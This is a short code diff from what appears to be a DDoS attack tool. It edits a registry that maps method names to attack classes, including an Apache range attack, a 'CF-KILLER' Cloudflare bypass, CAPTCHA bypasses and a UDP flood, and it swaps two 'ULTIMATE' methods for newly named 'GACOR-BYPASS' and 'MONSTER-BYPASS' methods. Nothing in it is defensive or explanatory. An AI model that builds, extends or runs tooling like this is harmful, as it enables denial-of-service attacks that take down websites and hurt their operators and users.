@@ -43,8 +43,8 @@ export class MethodExecutor {
         map.set('APACHE', Layer7.ApacheRangeAttack);
         map.set('NULL', Layer7.NullAttack);
         map.set('CF-KILLER', Layer7.CloudflareKiller);
-        map.set('SIMPLE-ULTIMATE', Layer7.SimpleUltimate);
-        map.set('BRUTAL-ULTIMATE', Layer7.BrutalUltimate);
+        map.set('GACOR-BYPASS', Layer7.GacorBypass);
+        map.set('MONSTER-BYPASS', Layer7.MonsterBypass);
 
         // Layer 4 Methods
         map.set('UDP', Layer4.UDPFlood);
@@ -124,7 +124,7 @@ export class MethodExecutor {
             
             // Check which constructor signature to use
             const simpleBypassMethods = ['CFB', 'CFBUAM', 'BYPASS', 'PRIVACYPASS', 'CAPTCHA', 'ULTIMATE'].includes(methodUpper);
-            const advancedBypassMethods = ['SIMPLE-ULTIMATE', 'BRUTAL-ULTIMATE'].includes(methodUpper);
+            const advancedBypassMethods = ['GACOR-BYPASS', 'MONSTER-BYPASS'].includes(methodUpper);
             
             for (let i = 0; i < numInstances; i++) {
                 let attack;
